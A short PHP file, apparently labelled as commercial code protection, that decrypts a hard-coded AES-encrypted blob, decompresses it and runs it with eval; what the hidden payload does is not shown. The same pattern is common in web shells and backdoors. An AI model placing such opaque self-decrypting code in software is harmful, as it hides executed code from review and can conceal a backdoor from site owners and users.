<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$k2b42a = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$pd77e4 = base64_decode('9IVffPBaYHPvE0UjxPKPvHJ2RGpJaDVxcnpPcFpFMUFRd21TdTJ3WjlMV0cwakFQbER3ZWNEYVpwKysveStBK0dpemRodFQwUklVOVhmQVl2TFhxV0RVWE5WT3BqQ0tSR2JQYlVOUXFGZEpnY09nUnUzKy9RZkZHZlFxd3hOT2VvQVJnY21pWGFqU1A0enU0dGNXZ21jcmdlbXl1RnB2UnpYWWxPWHRSN0FtNTh1d0RRb0NZWEJSZlZwMlhaYTF3YUFZOU1JcFhFWkJPTS9pWXhQK1F3R0J4WW9xNjV1dGFITmszcDhYamZzS0FXSEN5UjZ3ZVVKUDhqelJQLy94b0VkbG5xZVZzNXV5eHJ5V2tobkduZXFXd0tBQlMxb3AwVFBzSTZvZE9OL0hsanlWeWYyb1VDcjlTd01iSE13VmdiYllpVm5mOXg0NW1rUWxKcVorWlBZNGs4WmdrdHJ2YzBWOUd1Zz09');
$ie28ed = openssl_cipher_iv_length('aes-256-cbc');
$v84b8d = substr($pd77e4, 0, $ie28ed);
$c7fef7 = substr($pd77e4, $ie28ed);
eval('?>'.gzinflate(openssl_decrypt($c7fef7, 'aes-256-cbc', $k2b42a, 0, $v84b8d)));